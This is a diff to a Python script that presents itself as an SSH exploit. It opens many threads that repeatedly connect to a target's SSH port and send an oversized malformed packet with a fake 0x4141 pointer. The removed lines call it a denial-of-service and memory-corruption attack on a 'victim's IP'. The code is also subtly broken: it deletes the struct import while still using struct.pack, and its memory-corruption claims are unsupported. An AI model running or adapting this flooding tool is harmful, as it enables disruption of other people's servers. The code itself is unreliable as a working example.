@@ -1,48 +1,48 @@
-#!/usr/bin/env python3
-
 import socket
 import paramiko
 import threading
 import time
-import random
-import struct
+import logging
+from concurrent.futures import ThreadPoolExecutor
 
-TARGET_IP = "127.0.0.1"  # Replace with your victim's IP.
+TARGET_IP = "127.0.0.1"
 TARGET_PORT = 22
-THREADS = 500  # 500 threads, because why not?
+THREADS = 100  # Tuned for stability
+DELAY = 0.1
 
-# Craft a malformed packet to trigger memory corruption.
+logging.basicConfig(level=logging.INFO, format='[SSH-EXPLOIT] %(message)s')
+stop_event = threading.Event()
+
 def craft_evil_packet():
-    # Fake SSH packet header with a suspicious payload length.
-    packet = b'\x00\x00\x00\x0f'  # Bogus length.
-    packet += b'\x14'  # Packet type: SSH_MSG_KEXINIT (but hijacked).
-    # Payload: Write garbage into *probably* critical memory zones.
-    packet += b'A' * 10000  # Artisanal buffer overflow.
-    # Add a fake pointer to trigger Use-After-Free.
-    packet += struct.pack("<Q", 0x4141414141414141)  # *Very* suspicious memory address.
-    return packet
+    pkt = b'\x00\x00\x00\x0f' + b'\x14' + b'A' * 10000 + struct.pack("<Q", 0x4141414141414141)
+    return pkt
 
-# Send garbage packets in a loop.
 def send_garbage():
-    while True:
+    while not stop_event.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
             sock.connect((TARGET_IP, TARGET_PORT))
             transport = paramiko.Transport(sock)
-            # Send the packet of doom.
-            transport._send_message(craft_evil_packet())
-            print(f"[+] Packet sent! Memory corrupted at {TARGET_IP}:{TARGET_PORT}")
-            time.sleep(0.1)  # Avoid saturating *too* quickly.
+            pkt = craft_evil_packet()
+            transport._send_message(pkt)
+            logging.info("Packet sent successfully")
+            sock.close()
+            time.sleep(DELAY)
         except Exception as e:
-            print(f"[-] Error (but who cares?): {e}")
-            time.sleep(1)
+            logging.warning(f"Send error: {e}")
+            time.sleep(DELAY * 2)
 
-# Launch the DDOS + memory corruption attack.
+def main():
+    logging.info(f"Starting attack on {TARGET_IP}:{TARGET_PORT} with {THREADS} threads")
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        futures = [executor.submit(send_garbage) for _ in range(THREADS)]
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            logging.info("Stopping attack...")
+            stop_event.set()
+
 if __name__ == "__main__":
-    print(f"[!] SSHS activated. Target: {TARGET_IP}:{TARGET_PORT}")
-    print(f"[!] Sending {THREADS} threads to make the server cry...")
-    for _ in range(THREADS):
-        threading.Thread(target=send_garbage, daemon=True).start()
-    # Let it cook on low heat.
-    while True:
-        time.sleep(1)
+    main()
